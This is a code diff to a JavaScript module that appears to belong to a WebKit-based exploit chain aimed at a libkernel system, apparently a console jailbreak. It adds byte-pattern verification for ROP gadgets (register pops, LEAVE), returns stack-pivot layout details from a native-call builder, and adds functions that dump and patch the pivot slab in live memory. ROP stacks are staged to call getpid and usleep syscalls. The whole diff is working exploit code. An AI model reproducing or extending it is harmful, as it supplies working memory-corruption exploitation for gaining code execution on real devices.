@@ -3,7 +3,7 @@
  * Separate ArrayBuffers (same as chain_poops). Fire at PRIMITIVE-OK when lk known.
  */
 import { int64 } from "./int64.js";
-import { PIVOT_ROWS, verifyPivotSet } from "./pivot_gadgets.js";
+import { PIVOT_ROWS, verifyPivotSet, checkPivotBytes } from "./pivot_gadgets.js";
 
 export const SYS = { getpid: 20, getuid: 0x18 };
 
@@ -29,6 +29,47 @@ const GADGET_TABLE = [
 ];
 
 export { verifyPivotSet, PIVOT_ROWS };
+
+/** POP + epilogue gadgets used in layoutNativeCall (not covered by verifyPivotSet). */
+const CHAIN_POP_ROWS = [
+    ["POP_RDI", "wk_POP_RDI_RET", [0x5f, 0xc3]],
+    ["POP_RSI", "wk_POP_RSI_RET", [0x5e, 0xc3]],
+    ["POP_RDX", "wk_POP_RDX_RET", [0x5a, 0xc3]],
+    ["POP_RCX", "wk_POP_RCX_RET", [0x59, 0xc3]],
+    ["POP_R8", "wk_POP_R8_RET", [null, 0x58, 0xc3]],
+    ["POP_R9", "wk_POP_R9_RET", [null, 0x59, 0xc3]],
+    ["POP_RAX", "wk_POP_RAX_RET", [0x58, 0xc3]],
+    ["LEAVE", "wk_LEAVE_RET", [0xc9, 0xc3]],
+];
+
+/** Pivot G0-G5 + MOV_RDI_RAX + stack POP/LEAVE — chain_poops GAD table. */
+export function verifyFullChainSet(read1, base, off) {
+    const pivot = verifyPivotSet(read1, base, off);
+    const popGood = [];
+    const popBad = [];
+    const popMissing = [];
+    for (let i = 0; i < CHAIN_POP_ROWS.length; i++) {
+        const label = CHAIN_POP_ROWS[i][0];
+        const key = CHAIN_POP_ROWS[i][1];
+        const pat = CHAIN_POP_ROWS[i][2];
+        const rva = off[key];
+        if (rva == null) {
+            popMissing.push(label);
+            continue;
+        }
+        if (checkPivotBytes(read1, base, rva, pat))
+            popGood.push(label);
+        else
+            popBad.push(label);
+    }
+    return {
+        ok: pivot.ok && popBad.length === 0 && popMissing.length === 0,
+        pivot,
+        popGood,
+        popBad,
+        popMissing,
+    };
+}
 
 function resolveGadgetsTrust(webkitBase, off) {
     const G = {};
@@ -162,7 +203,9 @@ function layoutNativeCall(M, G, target, args) {
         at -= 8;
     for (let i = 0; i < insts.length; i++)
         put(M.stackDv, at + 8 * i, insts[i]);
-    put(M.pivotDv, M.pivotSp, M.K.add32(at));
+    const rsp = M.K.add32(at);
+    put(M.pivotDv, M.pivotSp, rsp);
+    return { at, rsp, insts: insts.length, targetIdx };
 }
 
 export function layoutGetpidSlab(M, G, stub) {
@@ -177,7 +220,7 @@ export function stageGetpid(p, prep, libkernelBase, off, stubOffOverride) {
         stubOff = off.k_stubs[SYS.getpid];
     if (stubOff == null)
         stubOff = off.k_getpid_syscall != null ? off.k_getpid_syscall : 0x4fa;
-    layoutNativeCall(prep.M, prep.G, libkernelBase.add32(stubOff), []);
+    prep._layout = layoutNativeCall(prep.M, prep.G, libkernelBase.add32(stubOff), []);
     prep.staged = true;
     prep.stubOff = stubOff;
 }
@@ -187,7 +230,7 @@ export function stageUsleep(p, prep, libkernelBase, off, usec) {
         throw new Error("stageUsleep: no prep");
     const fnOff = off.k_usleep != null ? off.k_usleep : 0x13b20;
     const arg = new int64((usec != null ? usec : 1000) >>> 0, 0);
-    layoutNativeCall(prep.M, prep.G, libkernelBase.add32(fnOff), [arg]);
+    prep._layout = layoutNativeCall(prep.M, prep.G, libkernelBase.add32(fnOff), [arg]);
     prep.staged = true;
 }
 
@@ -195,15 +238,59 @@ export function stageUsleep(p, prep, libkernelBase, off, usec) {
 export function layoutSmokeStack(prep) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("layoutSmokeStack: no prep");
-    layoutNativeCall(prep.M, prep.G, prep.G.POP_RAX_RET, [new int64(0, 0)]);
+    prep._layout = layoutNativeCall(prep.M, prep.G, prep.G.POP_RAX_RET, [new int64(0, 0)]);
     prep.staged = true;
     prep.stagedKind = "smoke";
+}
+
+/** Pre-N5 log: pivotDv slots + RSP target + first stack qwords. */
+export function describeSlabLayout(p, prep) {
+    if (!prep || !prep.M)
+        throw new Error("describeSlabLayout: no prep");
+    const M = prep.M;
+    const sp = M.pivotSp;
+    const rspLo = M.pivotDv.getUint32(sp, true);
+    const rspHi = M.pivotDv.getUint32(sp + 4, true);
+    const rsp = new int64(rspLo, rspHi);
+    const top = [];
+    if (prep._layout && prep._layout.at != null) {
+        const at = prep._layout.at;
+        for (let i = 0; i < 4; i++) {
+            const lo = M.stackDv.getUint32(at + 8 * i, true);
+            const hi = M.stackDv.getUint32(at + 8 * i + 4, true);
+            top.push(new int64(lo, hi));
+        }
+    }
+    let pivotPeek = null;
+    if (prep.pivotCell && p)
+        pivotPeek = p.read8(prep.pivotCell);
+    return {
+        S: M.S,
+        P: M.P,
+        K: M.K,
+        F: M.F,
+        pivotSp: sp,
+        rsp,
+        layout: prep._layout || null,
+        stackTop: top,
+        pivotCell: prep.pivotCell,
+        pivotPeek,
+        G5: prep.G && prep.G.G5,
+    };
+}
+
+/** Swap G5 in live slab (try expm1+0x53642a if table G5 OOMs at fire). */
+export function patchPrepG5(prep, g5Addr) {
+    if (!prep || !prep.M || !prep.G || !g5Addr)
+        throw new Error("patchPrepG5: bad args");
+    prep.G.G5 = g5Addr;
+    put(prep.M.pivotDv, 0x10, g5Addr);
 }
 
 export function layoutGetpidStack(prep, libkernelBase, stubOff) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("layoutGetpidStack: no prep");
-    layoutNativeCall(prep.M, prep.G, libkernelBase.add32(stubOff), []);
+    prep._layout = layoutNativeCall(prep.M, prep.G, libkernelBase.add32(stubOff), []);
     prep.staged = true;
     prep.stagedKind = "getpid";
     prep.stubOff = stubOff;
